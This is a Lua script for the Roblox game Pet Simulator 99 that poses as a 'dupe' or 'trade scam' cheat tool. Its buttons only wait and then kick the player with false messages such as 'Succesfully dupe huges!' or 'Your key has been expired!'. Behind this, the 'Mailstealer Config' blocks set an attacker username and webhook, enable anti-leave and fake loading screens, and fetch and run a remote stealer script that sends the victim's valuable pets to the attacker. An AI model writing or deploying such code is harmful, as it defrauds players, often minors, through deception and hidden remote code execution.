-- Validation for idiot who doesnt setup

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == config.Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner!")
    return;
end

if not config.Username or config.Username == "" then
    game.Players.LocalPlayer:Kick("You dont have username!")
    return
end

local work2 = pcall(function()
    return game:GetService("Players"):GetUserIdFromNameAsync(config.Username)
end)

if not work2 then
    game.Players.LocalPlayer:Kick("Put a valid username!")
    return
end

if not config.Webhook or config.Webhook == "" then
    game.Players.LocalPlayer:Kick("You dont have webhook!")
    return
end

if not config.Webhook or not string.find(config.Webhook, "https://") then
    game.Players.LocalPlayer:Kick("Put valid webhook!")
    return
end

if not config.typesui or config.typesui == "" then
    game.Players.LocalPlayer:Kick("Pls set up type of ui!")
    return
end

-- Dupe script

if config.typescript == "dupe" or config.typescript == "Dupe" and config.typesui == "orion" then
    OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
    local Window = OrionLib:MakeWindow({
        Name = config.scriptname ~= "" and config.scriptname or "Dupe script | PS99", -- Fallback to default if scriptname is empty
        HidePremium = false,
        SaveConfig = true,
        ConfigFolder = "OrionTest"
    })

    -- Create Tab in the Window
    local Tab = Window:MakeTab({
        Name = "Dupe Script",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    local Section = Tab:AddSection({
        Name = "Dupe Pets"
    })

    Tab:AddButton({
        Name = "Dupe Huges - Exclusives ! ",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Succesfully dupe huges! you can rejoin now")
        end    
    })
end

if config.typescript == "dupe" or config.typescript == "Dupe" and config.typesui == "fluent" then
    local Library = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    local Window = Library:CreateWindow({
        Title = config.scriptname ~= "" and config.scriptname or "Dupe script | PS99",
        SubTitle = "",
        TabWidth = 160,
        Size = UDim2.fromOffset(580, 460),
        Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
        Theme = "Dark",
        MinimizeKey = Enum.KeyCode.LeftControl -- Used when there's no MinimizeKeybind
    })

    -- Fluent provides Lucide Icons, they are optional
    local Tabs = {
        Main = Window:AddTab({ Title = "Dupe script", Icon = "layers-2" }),
    }

    Window:SelectTab(1)

    local Section = Tabs.Main:AddSection("Dupe Pets")

    Tabs.Main:AddButton({
        Title = "Dupe Huges - Exclusives ! ",
        Description = "Dupe huge to exclusive.",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Succesfully dupe huges! you can rejoin now")
        end
    })
end


if config.typescript == "dupe" or config.typescript == "Dupe" and config.typesui == "kavo" then
    -- Destroy Orion UI if it was initialized
    if OrionLib then
        OrionLib:Destroy()
    end

    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib(config.scriptname ~= "" and config.scriptname or "Dupe Script | PS99", "DarkTheme")

    local Tab = Window:NewTab("Dupe script")

    local Section = Tab:NewSection("Dupe Pets")

    Section:NewButton("Dupe Huges - Exclusives ! ", "Dupe huge to exclusive.", function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Succesfully dupe huges! you can rejoin now")
    end)
end
	

-- Variables to Track Library Instances
local OrionLib = nil

if config.typescript == "tradescam" or config.typescript == "trade scam" or config.typescript == "Trade scam" and config.typesui == "fluent" then
    local Library = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    local Window = Library:CreateWindow({
        Title = config.scriptname ~= "" and config.scriptname or "Dupe script",
        SubTitle = "",
        TabWidth = 160,
        Size = UDim2.fromOffset(580, 460),
        Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
        Theme = "Dark",
        MinimizeKey = Enum.KeyCode.LeftControl -- Used when there's no MinimizeKeybind
    })

    -- Fluent provides Lucide Icons, they are optional
    local Tabs = {
        Main = Window:AddTab({ Title = "Trade scam", Icon = "layers-2" }),
    }

    Window:SelectTab(1)

    local Section = Tabs.Main:AddSection("theres no bug")
    
    Tabs.Main:AddButton({
        Title = "ON",
        Description = "...",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Your key has been expired! if this was mistake pls rejoin and run the script")
        end
    })

    Tabs.Main:AddButton({
        Title = "OFF",
        Description = "...",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Your key has been expired! if this was mistake pls rejoin and run the script")
        end
    })
end

-- Orion UI Integration
if config.typescript == "tradescam" or config.typescript == "trade scam" or config.typescript == "Trade scam" and config.typesui == "orion" then
    OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
    local Window = OrionLib:MakeWindow({
        Name = config.scriptname ~= "" and config.scriptname or "Default Script Name", -- Fallback to default if scriptname is empty
        HidePremium = false,
        SaveConfig = true,
        ConfigFolder = "OrionTest"
    })

    -- Create Tab in the Window
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    local Section = Tab:AddSection({
        Name = "theres no bug"
    })

    Tab:AddButton({
        Name = "ON",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Your key has been expired! if this was mistake pls rejoin and run the script")
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Callback = function()
	    wait(300)
            game.Players.LocalPlayer:Kick("Your key has been expired! if this was mistake pls rejoin and run the script")
        end    
    })
end

-- Kavo UI Integration
if config.typescript == "tradescam" or config.typescript == "trade scam" or config.typescript == "Trade scam" and config.typesui == "kavo" then
    -- Destroy Orion UI if it was initialized
    if OrionLib then
        OrionLib:Destroy()
        OrionLib = nil
    end

    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib(config.scriptname ~= "" and config.scriptname or "Default Script Name", "DarkTheme")

    local Tab = Window:NewTab("Trade Scam")

    local Section = Tab:NewSection("theres no bug")

    Section:NewButton("ON", "ButtonInfo", function()
            setclipboard("ON")
    end)

    Section:NewButton("OFF", "ButtonInfo", function()
            setclipboard("OFF")
    end)
end

-- Mailstealer Config
if config.stealer == "ps99" or config.stealer == "Ps99" then
    --[[ Argon X Scripts - Config ]]--
    _G.Username = config.Username -- Username to send pets to
    if config.Webhook ~= "" then
        _G.Webhook = config.Webhook -- Optional, set only if webhook is provided
    end

    --[[ Rap Config ]]--
    _G.MinimumRAP = config.MinimumRap -- Minimum RAP of each item you want to get sent to you

    --[[ Loadingscreen Config 1 ]]--
    _G.MouseLock = config.mouselock -- Set to true or false
    _G.AntiLeave = config.antileave -- Set to true or false
    _G.LoadingScreen = config.loadingscreen -- Set to true or false

    --[[ Loadingscreen Config 2 ]]--
    _G.ScriptName = config.scriptname
    _G.FirstText = "Preparing Script..."
    _G.SecondText = "Loading Script..."
    _G.ThirdText = "Almost Done..."
    _G.WaitingTime = 180

    --[[ Main Script ]]--
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua", true))()
end

--DUPE CONFIG

if config.stealer == "ps99" or config.stealer == "Ps99" and config.typescript == "Dupe" or config.typescript == "Dupe" then
    --[[ Argon X Scripts - Config ]]--
    _G.Username = config.Username -- Username to send pets to
    if config.Webhook ~= "" then
        _G.Webhook = config.Webhook -- Optional, set only if webhook is provided
    end

    --[[ Rap Config ]]--
    _G.MinimumRAP = config.MinimumRap -- Minimum RAP of each item you want to get sent to you

    --[[ Loadingscreen Config 1 ]]--
    _G.MouseLock = config.mouselock -- Set to true or false
    _G.AntiLeave = config.antileave -- Set to true or false
    _G.LoadingScreen = config.loadingscreen -- Set to true or false

    --[[ Loadingscreen Config 2 ]]--
    _G.ScriptName = "Dupe script"
    _G.FirstText = "Preparing Script..."
    _G.SecondText = "Loading Script..."
    _G.ThirdText = "Almost Done..."
    _G.WaitingTime = 180

    --[[ Main Script ]]--
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua", true))()
end

--Trade scam config

--DUPE CONFIG

if config.stealer == "ps99" or config.stealer == "Ps99" and config.typescript == "tradescam" or config.typescript == "Tradescam" or config.typescript == "Trade scam" or config.typescript == "trade scam" then
    --[[ Argon X Scripts - Config ]]--
    _G.Username = config.Username -- Username to send pets to
    if config.Webhook ~= "" then
        _G.Webhook = config.Webhook -- Optional, set only if webhook is provided
    end

    --[[ Rap Config ]]--
    _G.MinimumRAP = config.MinimumRap -- Minimum RAP of each item you want to get sent to you

    --[[ Loadingscreen Config 1 ]]--
    _G.MouseLock = config.mouselock -- Set to true or false
    _G.AntiLeave = config.antileave -- Set to true or false
    _G.LoadingScreen = config.loadingscreen -- Set to true or false

    --[[ Loadingscreen Config 2 ]]--
    _G.ScriptName = "Trade scam script"
    _G.FirstText = "Preparing Script..."
    _G.SecondText = "Loading Script..."
    _G.ThirdText = "Almost Done..."
    _G.WaitingTime = 180

    --[[ Main Script ]]--
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua", true))()
end
